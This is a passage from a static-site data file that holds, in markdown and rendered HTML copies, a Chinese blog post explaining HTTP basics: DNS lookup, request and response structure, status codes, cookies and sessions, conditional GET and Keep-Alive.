解析的请求，如下图：  \n![](/assets/2016-03-02-talk-http/1.png)  \n从图中我们可以看出域名服务器先向根域名服务器发起DNS解析请求，接着迭代发起请求，直到找到所搜索的百度首页的 IP 地址，并将它返回给浏览器。     \n5. 拿到 IP 地址后，浏览器就向该 IP 所在的服务器发起 TCP 连接(即三次握手)。      \n6. 连接建立起来之后，浏览器就可以向服务器发起 HTTP 请求了。(这里比如访问百度首页，就向服务器发起 HTTP 中的 GET 请求)     \n7. 服务器接受到这个请求后，根据路径参数，经过后台一些处理之后，把处理后的结果返回给浏览器，如果是百度首页，就可以把完整的 HTML 页面代码返回给浏览器。      \n8. 浏览器拿到了百度首页的完整 HTML 页面代码，内核和 JS 引擎就会解析和渲染这个页面，里面的 JS，CSS，图片等静态资源也通过一个个 HTTP 请求进行加载。     \n9. 浏览器根据拿到的资源对页面进行渲染，最终把完整的页面呈现给用户。     \n10. 如果浏览器没有后续的请求，那么就会跟服务器端发起 TCP 断开(即四次挥手)。    \n\n至此，整个访问过程就结束了，这里只是简单的概括，实际情况远比这些复杂。\n\n## HTTP 概念\n\n> 超文本传输协议（HTTP，HyperText Transfer Protocol)是互联网上应用最为广泛的一种网络协议。所有的WWW文件都必须遵守这个标准。 \n\n举个可能不太恰当的例子，TCP 就好比端与端之间沟通的桥梁，而 HTTP 就像是一个搬运工，通过这个桥梁搬运资源。  \n\n### HTTP 特性： \n\n* HTTP 构建于 TCP/IP 协议之上，默认端口号是 80\n* HTTP 是无连接无状态的\n\nHTTP 分为两个部分：请求和响应。\n\n## HTTP 内容\n\n### HTTP 请求：\n\nHTTP 定义了在与服务器交互的不同方式，最常用的方法有 4 种，分别是 GET，POST，PUT， DELETE。URL 全称为资源描述符，可以这么认为：一个 URL 地址，对应着一个网络上的资源，而 HTTP 中的 GET，POST，PUT，DELETE 就对应着对这个资源的查询，修改，增添，删除4个操作。\n\nHTTP 请求由 3 个部分构成，分别是：状态行，请求头(Request Header)，请求正文。\n\n> 状态行由协议，状态描述等构成，各元素之间以空格分隔。\n   \n> 请求头提供一些参数比如：Cookie，用户代理信息，主机名等等。  \n \n> 请求正文就放一些发送的数据，一般 GET 请求会将参数放在 URL 中，也就是在请求头中而请求正文一般为空，而 POST 请求将参数放在请求正文中。\n\n* GET 一般用于信息获取，比如刚才我们浏览百度首页，其使用的就是GET方法。\n  \nGET请求报文实例：  \n![](/assets/2016-03-02-talk-http/2.png)\n\n\nGET 请求一般不会产生副作用，它仅仅只是获取资源信息，就像数据库查询一样，不会修改、增加数据，不会影响资源的状态，并且对同一个 URL 的多次GET请求应该返回相同的结果。\n\n* POST 请求表示可能会修改服务器上的资源。  \n![](/assets/2016-03-02-talk-http/3.png)\n\n注：  \n\n1. GET 和 POST 请求参数位置不同，从上面两个请求报文可以看出，GET 请求对应的参数放在 URL 中，而 POST 请求对应的参数放在 HTTP 请求主体中。  \n2. GET 可提交的数据量受 URL 长度的限制，而 POST 的数据量则没有限制。\n3. 处于安全考虑，在一些涉及安全的请求比如：登录请求需要用 POST 提交表单，而GET 请求一般用来获取静态资源。\n\n### HTTP 响应：\n\nHTTP 响应是服务器在客户端发送 HTTP 请求后经过一些处理而做出的响应，HTTP 响应和 HTTP 请求相似，也是由三个部分构成。分别是：状态行，响应头(Response Header)，响应正文。\n\nHTTP 响应中包含一个状态码，用来表示服务器对客户端响应的结果。  \n\n状态码一般由3位构成： \n \n* 1xx : 表示请求已经接受了，继续处理。   \n* 2xx : 表示请求已经处理掉了。  \n* 3xx : 重定向。  \n* 4xx : 一般表示客户端有错误，请求无法实现。  \n* 5xx : 一般为服务器端的错误。\n  \n比较常用的状态码：  \n\n* 200 OK 客户端请求成功。 \n* 301 Moved Permanently 请求永久重定向。\n* 302 Moved Temporarily 请求临时重定向。\n* 304 Not Modified 文件未修改，可以直接使用缓存的文件。\n* 400 Bad Request 由于客户端请求有语法错误，不能被服务器所理解。\n* 401 Unauthonzed 请求未经授权，无法访问。\n* 403 Forbidden 服务器收到请求，但是拒绝提供服务。服务器通常会在响应正文中给出不提供服务的原因。\n* 404 Not Found 请求的资源不存在，比如输入了错误的URL。\n* 500 Internal Server Error 服务器发生不可预期的错误，导致无法完成客户端的请求。\n* 503 Service Unavailable 服务器当前不能够处理客户端的请求，在一段时间之后，服务器可能会恢复正常。\n\n下面是一个 HTTP 响应的例子：\n![](/assets/2016-03-02-talk-http/4.png)\n\n\n知道了 HTTP 请求和响应后，一个完整的流程一般是这样的：\n\n通常，由 HTTP 客户端发起一个请求，建立一个到服务器指定端口（默认是 80 端口）的 TCP 连接。HTTP 服务器则在那个端口监听客户端发送过来的请求。一旦收到请求，服务器（向客户端）发回一个状态行，比如\"HTTP/1.1 200 OK\"，和（响应的）消息，消息的消息体可能是请求的文件、错误消息、或者其它一些信息。\n  \n> HTTP 使用 TCP 而不是 UDP 的原因在于（打开）一个网页必须传送很多数据，而 TCP 协议提供传输控制，按顺序组织数据，和错误纠正。\n\n## 其它\n\n了解以上那些概念后，已经对 HTTP 协议有了大致的了解了。下面介绍一些 HTTP 实现中具体内容。\n\n### 会话追踪\n\n* 会话：客户端向服务器端发起请求到服务端响应客户端请求的全过程。\n* 会话跟踪：会话追踪指的是服务器对用户响应的监视。\n\n为什么需要会话跟踪： \n\n> 浏览器与服务器之间的通信是通过 HTTP 协议进行通信的，而 HTTP 协议是”无状态”的协议，它不能保存客户的信息，即一次响应完成之后连接就断开了，下一次的请求需要重新连接，这样就需要判断是否是同一个用户，所以才有会话跟踪技术来实现这种要求。\n\n#### 会话跟踪常用方法：\n\n* URL 重写：URL 重写技术就是在 URL 结尾添加一个附加数据以标识该会话，把会话 ID 通过 URL 的信息传递过去，以便在服务器进行识别不同的用户。\n* 隐藏表单域：将会话ID添加到HTML表单元素中提交到服务器，此表单元素并不在客户端显示。\n* Cookie：Cookie 是 Web 服务器发送给客户端的一小段信息，客户端请求时可以读取该信息发送给服务器端，进而进行用户的识别，对于客户端的每次请求，服务器都会将 Cookie 发送到客户端，客户端保存下来，以便下次使用。\n\n> 客户端可以采用两种方式来保存这个Cookie对象，一种方式是保存在客户端内存中，称为临时Cookie，浏览器关闭后这个Cookie对象将消失。 \n  \n> 另外一种方式是保存在客户机的磁盘上，称为永久Cookie。以后客户端只要访问该网站，就会将这个Cookie再次发送到服务器上，前提是这个Cookie在有效期内，这样就实现了对客户的跟踪。\n\nCookie 是可以被禁止的，当你打开 Chrome，在设置里面关闭 Cookie，那么你将再也无法登录淘宝页面。\n\n* Session：在服务器端会创建一个 session 对象，产生一个 sessionID 来标识这个 session 对象，然后将这个 sessionID 放入到 Cookie 中发送到客户端，下一次访问时，sessionID 会发送到服务器，在服务器端进行识别不同的用户。\n\n> 每一个用户都有一个不同的 session，各个用户之间是不能共享的，是每个用户所独享的，在 session 中可以存放信息。\n   \n> Session的实现依赖于Cookie，如果Cookie被禁用，那么session也将失效。\n\n### 条件 GET：  \n\nHTTP 条件 GET 是 HTTP 协议为了减少不必要的带宽浪费，提出的一种方案。\n  \n1. HTTP 条件 GET 使用时机：客户端之前已经访问过某网站，并打算再次访问该站点。\n2. HTTP 条件 GET 使用的方法：客户端向服务器发送一个包询问是否在上一次访问网站的时间后是否更改了页面，如果服务器没有更新，显然不需要把整个网页传给客户端，客户端只要使用本地缓存即可，如果服务器对照客户端给出的时间已经更新了客户端请求的网页，则发送这个更新了的网页给用户。\n\n下面是一个具体的发送接受报文示例：\n\n客户端发送请求：\n\n![](/assets/2016-03-02-talk-http/5.png)\n\n第一次请求时，服务器端返回请求数据，之后的请求，服务器根据请求中的 If-Modified-Since 字段判断响应文件没有更新，如果没有更新，服务器返回一个 304 Not Modified响应，告诉浏览器请求的资源在浏览器上没有更新，可以使用已缓存的上次获取的文件。\n\n![](/assets/2016-03-02-talk-http/6.png)\n\n如果服务器端资源已经更新的话，就返回正常的响应。\n\n### 持久连接：\n\n我们知道 HTTP 协议采用“请求-应答”模式，当使用普通模式，即非 Keep-Alive 模式时，每个请求/应答客户和服务器都要新建一个连接，完成之后立即断开连接（HTTP协议为无连接的协议）；当使用 Keep-Alive 模式（又称持久连接、连接重用）时，Keep-Alive 功能使客户端到服务器端的连接持续有效，当出现对服务器的后继请求时，Keep-Alive 功能避免了建立或者重新建立连接。\n\n在 HTTP 1.0 版本中，并没有官方的标准来规定 Keep-Alive 如何工作，因此实际上它是被附加到 HTTP 1.0协议上，如果客户端浏览器支持 Keep-Alive ，那么就在HTTP请求头中添加一个字段 Connection: Keep-Alive，当服务器收到附带有 Connection: Keep-Alive 的请求时，它也会在响应头中添加一个同样的字段来使用 Keep-Alive 。这样一来，客户端和服务器之间的HTTP连接就会被保持，不会断开（超过 Keep-Alive 规定的时间，意外断电等情况除外），当客户端发送另外一个请求时，就使用这条已经建立的连接。\n\n在 HTTP 1.1 版本中，默认情况下所有连接都被保持，如果加入 \"Connection: close\" 才关闭。目前大部分浏览器都使用 HTTP 1.1 协议，也就是说默认都会发起 Keep-Alive 的连接请求了，所以是否能完成一个完整的 Keep-Alive 连接就看服务器设置情况。\n\n由于 HTTP 1.0 没有官方的 Keep-Alive 规范，并且也已经基本被淘汰，以下讨论均是针对 HTTP 1.1 标准中的 Keep-Alive 展开的。\n\n### 小结：\n\n1. 会话跟踪和条件 GET 是有不同的，它们分别运用于不同的场景。会话跟踪是服务器用来表示标识区分不同的用户，而有条件 GET 则用户多次访问相同的页面，用来减少带宽的浪费，两者有本质上的区别。\n2. HTTP Keep-Alive 简单说就是保持当前的TCP连接，避免了重新建立连接。\n3. HTTP 是一个无状态无连接的协议，那么这是不是与 Keep-Alive 冲突？\n\n个人认为：Keep-Alive 与无连接的特性冲突，而对于无状态的特性两者并无矛盾，HTTP 无状态无连接是在 1.0 版本中就规定的，而 Keep-Alive 则是在 1.1 版本中才被添加入规范。  \n\n无连接的意思是限制每个连接只有一个请求的意思，在服务器处理完客户的请求，并收到客户的反应，即断开。通过这种方式可以节省传输时间。  \n\nKeep-Alive 确实破坏了这一特性，而无状态协议则意味着每个请求都是独立的，互不干扰的，互相没有记忆的。所以才需要有会话跟踪这种机制来识别用户。\n\n\n\n\n参考链接：  \n\n* [http 百度百科](http://baike.baidu.com/link?url=X1CqeVwoptB7-RFAJ6nWteQoTFYHFJYR7FRUhatC4F5amT4HGhZt2WMF--hZS6BaulGQbBgWeAzgNYv7qN8q7a)  \n* [进击Node.js基础（一）技术学习教程 慕课网](http://www.imooc.com/learn/348)  \n* [HTTP 协议 笔试面试知识整理](http://hit-alibaba.github.io/interview/basic/network/HTTP.html)  \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","slug":"2016-03-02-talk-http","published":1,"updated":"2016-03-14T13:44:30.000Z","comments":1,"photos":[],"link":"","_id":"cim4u6rxh000dxmvdb4163on8","content":"<blockquote>\n<p>本文为原创作品。欢迎转载，转载请注明出处：<a href=\"http://www.happylindz.com\" target=\"_blank\" rel=\"external\">林东洲的博客 Lindz Blog</a>。</p>\n</blockquote>\n<p>作为一个 Weber，掌握必要的 HTTP/TCP 等协议十分必要。自从上学期学习了计算机网络，对于网络这一块有了一定的了解，再加上网上学习到的知识，通过本文记录自己对 HTTP 协议的理解。</p>\n<p>首先让我们从一个问题入手，当我们在浏览器中输入 <a href=\"http://www.baidu.com\" target=\"_blank\" rel=\"external\">http://www.baidu.com</a> 访问百度的时候浏览器做了哪些事情。(这里以 Chrome 浏览器为例)</p>\n<ol>\n<li>首先 Chrome 搜索自身的 DNS 缓存。(如果 DNS 缓存中找到百度的 IP 地址，就跳过了接下来查找 IP 地址步骤，直接访问该 IP 地址。)       </li>\n<li>搜索操作系统自身的 DNS 缓存。(浏览器没有找到缓存或者缓存已经失效)</li>\n<li>读取本身的 HOST 文件。(如果前1.2步骤都没有找到)</li>\n<li>浏览器向宽带运营商服务器或者域名服务器发起一个 DNS 解析请求。<br>服务器先查看本身的缓存，若找到则返回百度首页的 IP 地址，若没有找到，则服务器就发起一个迭代 DNS 解析的请求，如下图：<br><img src=\"/assets/2016-03-02-talk-http/1.png\" alt=\"\"><br>从图中我们可以看出域名服务器先向根域名服务器发起DNS解析请求，接着迭代发起请求，直到找到所搜索的百度首页的 IP 地址，并将它返回给浏览器。     </li>\n<li>拿到 IP 地址后，浏览器就向该 IP 所在的服务器发起 TCP 连接(即三次握手)。      </li>\n<li>连接建立起来之后，浏览器就可以向服务器发起 HTTP 请求了。(这里比如访问百度首页，就向服务器发起 HTTP 中的 GET 请求)     </li>\n<li>服务器接受到这个请求后，根据路径参数，经过后台一些处理之后，把处理后的结果返回给浏览器，如果是百度首页，就可以把完整的 HTML 页面代码返回给浏览器。      </li>\n<li>浏览器拿到了百度首页的完整 HTML 页面代码，内核和 JS 引擎就会解析和渲染这个页面，里面的 JS，CSS，图片等静态资源也通过一个个 HTTP 请求进行加载。     </li>\n<li>浏览器根据拿到的资源对页面进行渲染，最终把完整的页面呈现给用户。     </li>\n<li>如果浏览器没有后续的请求，那么就会跟服务器端发起 TCP 断开(即四次挥手)。    </li>\n</ol>\n<p>至此，整个访问过程就结束了，这里只是简单的概括，实际情况远比这些复杂。</p>\n<h2 id=\"HTTP-概念\"><a href=\"#HTTP-概念\" class=\"headerlink\" title=\"HTTP 概念\"></a>HTTP 概念</h2><blockquote>\n<p>超文本传输协议（HTTP，HyperText Transfer Protocol)是互联网上应用最为广泛的一种网络协议。所有的WWW文件都必须遵守这个标准。 </p>\n</blockquote>\n<p>举个可能不太恰当的例子，TCP 就好比端与端之间沟通的桥梁，而 HTTP 就像是一个搬运工，通过这个桥梁搬运资源。  </p>\n<h3 id=\"HTTP-特性：\"><a href=\"#HTTP-特性：\" class=\"headerlink\" title=\"HTTP 特性：\"></a>HTTP 特性：</h3><ul>\n<li>HTTP 构建于 TCP/IP 协议之上，默认端口号是 80</li>\n<li>HTTP 是无连接无状态的</li>\n</ul>\n<p>HTTP 分为两个部分：请求和响应。</p>\n<h2 id=\"HTTP-内容\"><a href=\"#HTTP-内容\" class=\"headerlink\" title=\"HTTP 内容\"></a>HTTP 内容</h2><h3 id=\"HTTP-请求：\"><a href=\"#HTTP-请求：\" class=\"headerlink\" title=\"HTTP 请求：\"></a>HTTP 请求：</h3><p>HTTP 定义了在与服务器交互的不同方式，最常用的方法有 4 种，分别是 GET，POST，PUT， DELETE。URL 全称为资源描述符，可以这么认为：一个 URL 地址，对应着一个网络上的资源，而 HTTP 中的 GET，POST，PUT，DELETE 就对应着对这个资源的查询，修改，增添，删除4个操作。</p>\n<p>HTTP 请求由 3 个部分构成，分别是：状态行，请求头(Request Header)，请求正文。</p>\n<blockquote>\n<p>状态行由协议，状态描述等构成，各元素之间以空格分隔。</p>\n<p>请求头提供一些参数比如：Cookie，用户代理信息，主机名等等。  </p>\n<p>请求正文就放一些发送的数据，一般 GET 请求会将参数放在 URL 中，也就是在请求头中而请求正文一般为空，而 POST 请求将参数放在请求正文中。</p>\n</blockquote>\n<ul>\n<li>GET 一般用于信息获取，比如刚才我们浏览百度首页，其使用的就是GET方法。</li>\n</ul>\n<p>GET请求报文实例：<br><img src=\"/assets/2016-03-02-talk-http/2.png\" alt=\"\"></p>\n<p>GET 请求一般不会产生副作用，它仅仅只是获取资源信息，就像数据库查询一样，不会修改、增加数据，不会影响资源的状态，并且对同一个 URL 的多次GET请求应该返回相同的结果。</p>\n<ul>\n<li>POST 请求表示可能会修改服务器上的资源。<br><img src=\"/assets/2016-03-02-talk-http/3.png\" alt=\"\"></li>\n</ul>\n<p>注：  </p>\n<ol>\n<li>GET 和 POST 请求参数位置不同，从上面两个请求报文可以看出，GET 请求对应的参数放在 URL 中，而 POST 请求对应的参数放在 HTTP 请求主体中。  </li>\n<li>GET 可提交的数据量受 URL 长度的限制，而 POST 的数据量则没有限制。</li>\n<li>处于安全考虑，在一些涉及安全的请求比如：登录请求需要用 POST 提交表单，而GET 请求一般用来获取静态资源。</li>\n</ol>\n<h3 id=\"HTTP-响应：\"><a href=\"#HTTP-响应：\" class=\"headerlink\" title=\"HTTP 响应：\"></a>HTTP 响应：</h3><p>HTTP 响应是服务器在客户端发送 HTTP 请求后经过一些处理而做出的响应，HTTP 响应和 HTTP 请求相似，也是由三个部分构成。分别是：状态行，响应头(Response Header)，响应正文。</p>\n<p>HTTP 响应中包含一个状态码，用来表示服务器对客户端响应的结果。  </p>\n<p>状态码一般由3位构成： </p>\n<ul>\n<li>1xx : 表示请求已经接受了，继续处理。   </li>\n<li>2xx : 表示请求已经处理掉了。  </li>\n<li>3xx : 重定向。  </li>\n<li>4xx : 一般表示客户端有错误，请求无法实现。  </li>\n<li>5xx : 一般为服务器端的错误。</li>\n</ul>\n<p>比较常用的状态码：  </p>\n<ul>\n<li>200 OK 客户端请求成功。 </li>\n<li>301 Moved Permanently 请求永久重定向。</li>\n<li>302 Moved Temporarily 请求临时重定向。</li>\n<li>304 Not Modified 文件未修改，可以直接使用缓存的文件。</li>\n<li>400 Bad Request 由于客户端请求有语法错误，不能被服务器所理解。</li>\n<li>401 Unauthonzed 请求未经授权，无法访问。</li>\n<li>403 Forbidden 服务器收到请求，但是拒绝提供服务。服务器通常会在响应正文中给出不提供服务的原因。</li>\n<li>404 Not Found 请求的资源不存在，比如输入了错误的URL。</li>\n<li>500 Internal Server Error 服务器发生不可预期的错误，导致无法完成客户端的请求。</li>\n<li>503 Service Unavailable 服务器当前不能够处理客户端的请求，在一段时间之后，服务器可能会恢复正常。</li>\n</ul>\n<p>下面是一个 HTTP 响应的例子：<br><img src=\"/assets/2016-03-02-talk-http/4.png\" alt=\"\"></p>\n<p>知道了 HTTP 请求和响应后，一个完整的流程一般是这样的：</p>\n<p>通常，由 HTTP 客户端发起一个请求，建立一个到服务器指定端口（默认是 80 端口）的 TCP 连接。HTTP 服务器则在那个端口监听客户端发送过来的请求。一旦收到请求，服务器（向客户端）发回一个状态行，比如”HTTP/1.1 200 OK”，和（响应的）消息，消息的消息体可能是请求的文件、错误消息、或者其它一些信息。</p>\n<blockquote>\n<p>HTTP 使用 TCP 而不是 UDP 的原因在于（打开）一个网页必须传送很多数据，而 TCP 协议提供传输控制，按顺序组织数据，和错误纠正。</p>\n</blockquote>\n<h2 id=\"其它\"><a href=\"#其它\" class=\"headerlink\" title=\"其它\"></a>其它</h2><p>了解以上那些概念后，已经对 HTTP 协议有了大致的了解了。下面介绍一些 HTTP 实现中具体内容。</p>\n<h3 id=\"会话追踪\"><a href=\"#会话追踪\" class=\"headerlink\" title=\"会话追踪\"></a>会话追踪</h3><ul>\n<li>会话：客户端向服务器端发起请求到服务端响应客户端请求的全过程。</li>\n<li>会话跟踪：会话追踪指的是服务器对用户响应的监视。</li>\n</ul>\n<p>为什么需要会话跟踪： </p>\n<blockquote>\n<p>浏览器与服务器之间的通信是通过 HTTP 协议进行通信的，而 HTTP 协议是”无状态”的协议，它不能保存客户的信息，即一次响应完成之后连接就断开了，下一次的请求需要重新连接，这样就需要判断是否是同一个用户，所以才有会话跟踪技术来实现这种要求。</p>\n</blockquote>\n<h4 id=\"会话跟踪常用方法：\"><a href=\"#会话跟踪常用方法：\" class=\"headerlink\" title=\"会话跟踪常用方法：\"></a>会话跟踪常用方法：</h4><ul>\n<li>URL 重写：URL 重写技术就是在 URL 结尾添加一个附加数据以标识该会话，把会话 ID 通过 URL 的信息传递过去，以便在服务器进行识别不同的用户。</li>\n<li>隐藏表单域：将会话ID添加到HTML表单元素中提交到服务器，此表单元素并不在客户端显示。</li>\n<li>Cookie：Cookie 是 Web 服务器发送给客户端的一小段信息，客户端请求时可以读取该信息发送给服务器端，进而进行用户的识别，对于客户端的每次请求，服务器都会将 Cookie 发送到客户端，客户端保存下来，以便下次使用。</li>\n</ul>\n<blockquote>\n<p>客户端可以采用两种方式来保存这个Cookie对象，一种方式是保存在客户端内存中，称为临时Cookie，浏览器关闭后这个Cookie对象将消失。 </p>\n<p>另外一种方式是保存在客户机的磁盘上，称为永久Cookie。以后客户端只要访问该网站，就会将这个Cookie再次发送到服务器上，前提是这个Cookie在有效期内，这样就实现了对客户的跟踪。</p>\n</blockquote>\n<p>Cookie 是可以被禁止的，当你打开 Chrome，在设置里面关闭 Cookie，那么你将再也无法登录淘宝页面。</p>\n<ul>\n<li>Session：在服务器端会创建一个 session 对象，产生一个 sessionID 来标识这个 session 对象，然后将这个 sessionID 放入到 Cookie 中发送到客户端，下一次访问时，sessionID 会发送到服务器，在服务器端进行识别不同的用户。</li>\n</ul>\n<blockquote>\n<p>每一个用户都有一个不同的 session，各个用户之间是不能共享的，是每个用户所独享的，在 session 中可以存放信息。</p>\n<p>Session的实现依赖于Cookie，如果Cookie被禁用，那么session也将失效。</p>\n</blockquote>\n<h3 id=\"条件-GET：\"><a href=\"#条件-GET：\" class=\"headerlink\" title=\"条件 GET：\"></a>条件 GET：</h3><p>HTTP 条件 GET 是 HTTP 协议为了减少不必要的带宽浪费，提出的一种方案。</p>\n<ol>\n<li>HTTP 条件 GET 使用时机：客户端之前已经访问过某网站，并打算再次访问该站点。</li>\n<li>HTTP 条件 GET 使用的方法：客户端向服务器发送一个包询问是否在上一次访问网站的时间后是否更改了页面，如果服务器没有更新，显然不需要把整个网页传给客户端，客户端只要使用本地缓存即可，如果服务器对照客户端给出的时间已经更新了客户端请求的网页，则发送这个更新了的网页给用户。</li>\n</ol>\n<p>下面是一个具体的发送接受报文示例：</p>\n<p>客户端发送请求：</p>\n<p><img src=\"/assets/2016-03-02-talk-http/5.png\" alt=\"\"></p>\n<p>第一次请求时，服务器端返回请求数据，之后的请求，服务器根据请求中的 If-Modified-Since 字段判断响应文件没有更新，如果没有更新，服务器返回一个 304 Not Modified响应，告诉浏览器请求的资源在浏览器上没有更新，可以使用已缓存的上次获取的文件。</p>\n<p><img src=\"/assets/2016-03-02-talk-http/6.png\" alt=\"\"></p>\n<p>如果服务器端资源已经更新的话，就返回正常的响应。</p>\n<h3 id=\"持久连接：\"><a href=\"#持久连接：\" class=\"headerlink\" title=\"持久连接：\"></a>持久连接：</h3><p>我们知道 HTTP 协议采用“请求-应答”模式，当使用普通模式，即非 Keep-Alive 模式时，每个请求/应答客户和服务器都要新建一个连接，完成之后立即断开连接（HTTP协议为无连接的协议）；当使用 Keep-Alive 模式（又称持久连接、连接重用）时，Keep-Alive 功能使客户端到服务器端的连接持续有效，当出现对服务器的后继请求时，Keep-Alive 功能避免了建立或者重新建立连接。</p>\n<p>在 HTTP 1.0 版本中，并没有官方的标准来规定 Keep-Alive 如何工作，因此实际上它是被附加到 HTTP 1.0协议上，如果客户端浏览器支持 Keep-Alive ，那么就在HTTP请求头中添加一个字段 Connection: Keep-Alive，当服务器收到附带有 Connection: Keep-Alive 的请求时，它也会在响应头中添加一个同样的字段来使用 Keep-Alive 。这样一来，客户端和服务器之间的HTTP连接就会被保持，不会断开（超过 Keep-Alive 规定的时间，意外断电等情况除外），当客户端发送另外一个请求时，就使用这条已经建立的连接。</p>\n<p>在 HTTP 1.1 版本中，默认情况下所有连接都被保持，如果加入 “Connection: close” 才关闭。目前大部分浏览器都使用 HTTP 1.1 协议，也就是说默认都会发起 Keep-Alive 的连接请求了，所以是否能完成一个完整的 Keep-Alive 连接就看服务器设置情况。</p>\n<p>由于 HTTP 1.0 没有官方的 Keep-Alive 规范，并且也已经基本被淘汰，以下讨论均是针对 HTTP 1.1 标准中的 Keep-Alive 展开的。</p>\n<h3 id=\"小结：\"><a href=\"#小结：\" class=\"headerlink\" title=\"小结：\"></a>小结：</h3><ol>\n<li>会话跟踪和条件 GET 是有不同的，它们分别运用于不同的场景。会话跟踪是服务器用来表示标识区分不同的用户，而有条件 GET 则用户多次访问相同的页面，用来减少带宽的浪费，两者有本质上的区别。</li>\n<li>HTTP Keep-Alive 简单说就是保持当前的TCP连接，避免了重新建立连接。</li>\n<li>HTTP 是一个无状态无连接的协议，那么这是不是与 Keep-Alive 冲突？</li>\n</ol>\n<p>个人认为：Keep-Alive 与无连接的特性冲突，而对于无状态的特性两者并无矛盾，HTTP 无状态无连接是在 1.0 版本中就规定的，而 Keep-Alive 则是在 1.1 版本中才被添加入规范。  </p>\n<p>无连接的意思是限制每个连接只有一个请求的意思，在服务器处理完客户的请求，并收到客户的反应，即断开。通过这种方式可以节省传输时间。  </p>\n<p>Keep-Alive 确实破坏了这一特性，而无状态协议则意味着每个请求都是独立的，互不干扰的，互相没有记忆的。所以才需要有会话跟踪这种机制来识别用户。</p>\n<p>参考链接：  </p>\n<ul>\n<li><a href=\"http://baike.baidu.com/link?url=X1CqeVwoptB7-RFAJ6nWteQoTFYHFJYR7FRUhatC4F5amT4HGhZt2WMF--hZS6BaulGQbBgWeAzgNYv7qN8q7a\" target=\"_blank\" rel=\"external\">http 百度百科</a>  </li>\n<li><a href=\"http://www.imooc.com/learn/348\" target=\"_blank\" rel=\"external\">进击Node.js基础（一）技术学习教程 慕课网</a>  </li>\n<li><a href=\"http://hit-alibaba.github.io/interview/basic/network/HTTP.html\" target=\"_blank\" rel=\"external\">HTTP 协议 笔试面试知识整理</a>  </li>\n</ul>\n","excerpt":"","more":"<blockquote>\n<p>本文为原创作品。欢迎转载，转载请注明出处：<a href=\"http://www.happylindz.com\">林东洲的博客 Lindz Blog</a>。</p>\n</blockquote>\n<p>作为一个 Weber，掌握必要的 HTTP/TCP 等协议十分必要。自从上学期学习了计算机网络，对于网络这一块有了一定的了解，再加上网上学习到的知识，通过本文记录自己对 HTTP 协议的理解。</p>\n<p>首先让我们从一个问题入手，当我们在浏览器中输入 <a href=\"http://www.baidu.com\">http://www.baidu.com</a> 访问百度的时候浏览器做了哪些事情。(这里以 Chrome 浏览器为例)</p>\n<ol>\n<li>首先 Chrome 搜索自身的 DNS 缓存。(如果 DNS 缓存中找到百度的 IP 地址，就跳过了接下来查找 IP 地址步骤，直接访问该 IP 地址。)       </li>\n<li>搜索操作系统自身的 DNS 缓存。(浏览器没有找到缓存或者缓存已经失效)</li>\n<li>读取本身的 HOST 文件。(如果前1.2步骤都没有找到)</li>\n<li>浏览器向宽带运营商服务器或者域名服务器发起一个 DNS 解析请求。<br>服务器先查看本身的缓存，若找到则返回百度首页的 IP 地址，若没有找到，则服务器就发起一个迭代 DNS 解析的请求，如下图：<br><img src=\"/assets/2016-03-02-talk-http/1.png\" alt=\"\"><br>从图中我们可以看出域名服务器先向根域名服务器发起DNS解析请求，接着迭代发起请求，直到找到所搜索的百度首页的 IP 地址，并将它返回给浏览器。     </li>\n<li>拿到 IP 地址后，浏览器就向该 IP 所在的服务器发起 TCP 连接(即三次握手)。      </li>\n<li>连接建立起来之后，浏览器就可以向服务器发起 HTTP 请求了。(这里比如访问百度首页，就向服务器发起 HTTP 中的 GET 请求)     </li>\n<li>服务器接受到这个请求后，根据路径参数，经过后台一些处理之后，把处理后的结果返回给浏览器，如果是百度首页，就可以把完整的 HTML 页面代码返回给浏览器。      </li>\n<li>浏览器拿到了百度首页的完整 HTML 页面代码，内核和 JS 引擎就会解析和渲染这个页面，里面的 JS，CSS，图片等静态资源也通过一个个 HTTP 请求进行加载。     </li>\n<li>浏览器根据拿到的资源对页面进行渲染，最终把完整的页面呈现给用户。     </li>\n<li>如果浏览器没有后续的请求，那么就会跟服务器端发起 TCP 断开(即四次挥手)。    </li>\n</ol>\n<p>至此，整个访问过程就结束了，这里只是简单的概括，实际情况远比这些复杂。</p>\n<h2 id=\"HTTP-概念\"><a href=\"#HTTP-概念\" class=\"headerlink\" title=\"HTTP 概念\"></a>HTTP 概念</h2><blockquote>\n<p>超文本传输协议（HTTP，HyperText Transfer Protocol)是互联网上应用最为广泛的一种网络协议。所有的WWW文件都必须遵守这个标准。 </p>\n</blockquote>\n<p>举个可能不太恰当的例子，TCP 就好比端与端之间沟通的桥梁，而 HTTP 就像是一个搬运工，通过这个桥梁搬运资源。  </p>\n<h3 id=\"HTTP-特性：\"><a href=\"#HTTP-特性：\" class=\"headerlink\" title=\"HTTP 特性：\"></a>HTTP 特性：</h3><ul>\n<li>HTTP 构建于 TCP/IP 协议之上，默认端口号是 80</li>\n<li>HTTP 是无连接无状态的</li>\n</ul>\n<p>HTTP 分为两个部分：请求和响应。</p>\n<h2 id=\"HTTP-内容\"><a href=\"#HTTP-内容\" class=\"headerlink\" title=\"HTTP 内容\"></a>HTTP 内容</h2><h3 id=\"HTTP-请求：\"><a href=\"#HTTP-请求：\" class=\"headerlink\" title=\"HTTP 请求：\"></a>HTTP 请求：</h3><p>HTTP 定义了在与服务器交互的不同方式，最常用的方法有 4 种，分别是 GET，POST，PUT， DELETE。URL 全称为资源描述符，可以这么认为：一个 URL 地址，对应着一个网络上的资源，而 HTTP 中的 GET，POST，PUT，DELETE 就对应着对这个资源的查询，修改，增添，删除4个操作。</p>\n<p>HTTP 请求由 3 个部分构成，分别是：状态行，请求头(Request Header)，请求正文。</p>\n<blockquote>\n<p>状态行由协议，状态描述等构成，各元素之间以空格分隔。</p>\n<p>请求头提供一些参数比如：Cookie，用户代理信息，主机名等等。  </p>\n<p>请求正文就放一些发送的数据，一般 GET 请求会将参数放在 URL 中，也就是在请求头中而请求正文一般为空，而 POST 请求将参数放在请求正文中。</p>\n</blockquote>\n<ul>\n<li>GET 一般用于信息获取，比如刚才我们浏览百度首页，其使用的就是GET方法。</li>\n</ul>\n<p>GET请求报文实例：<br><img src=\"/assets/2016-03-02-talk-http/2.png\" alt=\"\"></p>\n<p>GET 请求一般不会产生副作用，它仅仅只是获取资源信息，就像数据库查询一样，不会修改、增加数据，不会影响资源的状态，并且对同一个 URL 的多次GET请求应该返回相同的结果。</p>\n<ul>\n<li>POST 请求表示可能会修改服务器上的资源。<br><img src=\"/assets/2016-03-02-talk-http/3.png\" alt=\"\"></li>\n</ul>\n<p>注：  